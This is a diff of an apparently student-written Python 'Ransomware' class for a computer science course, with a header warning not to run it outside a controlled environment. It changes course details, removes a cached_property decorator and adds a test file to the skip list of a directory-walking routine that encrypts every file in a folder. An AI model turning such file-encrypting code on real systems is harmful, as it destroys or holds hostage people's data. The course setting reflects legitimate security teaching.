@@ -2,8 +2,8 @@
 
 """
 Name: Batyr Mammetesenov
-Class: CMPSCI 130
-Instructor:
+Class: CMPSC 131
+Instructor: Griselda Conejo Lopez
 
 WARNING:
 Do not run this script outside of a controlled environment.
@@ -15,7 +15,6 @@ import logging  # For logging debug messages.
 import os       # For interacting with the operating system (e.g., file paths).
 import sys      # For accessing system-specific parameters and functions.
 import base64   # For encoding and decoding data using Base64.
-from cached_property import cached_property
 
 
 class Ransomware:
@@ -109,7 +108,7 @@ class Ransomware:
 
         for file in os.listdir(path):
             # Skip specified files and directories.
-            if file in ('README.md', script_name, '.git', '.', '..', 'requirements.txt'):
+            if file in ('README.md', script_name, '.git', '.', '..', 'requirements.txt', 'test_ransomware.py'):
                 logging.debug(f"Skipping file: {file}")
                 continue
 
@@ -177,8 +176,7 @@ class Ransomware:
 
 
     """
-    
-    @cached_property
+
     def encrypt_files_in_folder(self, path):
         """
         Encrypts all files in the given directory specified by path.
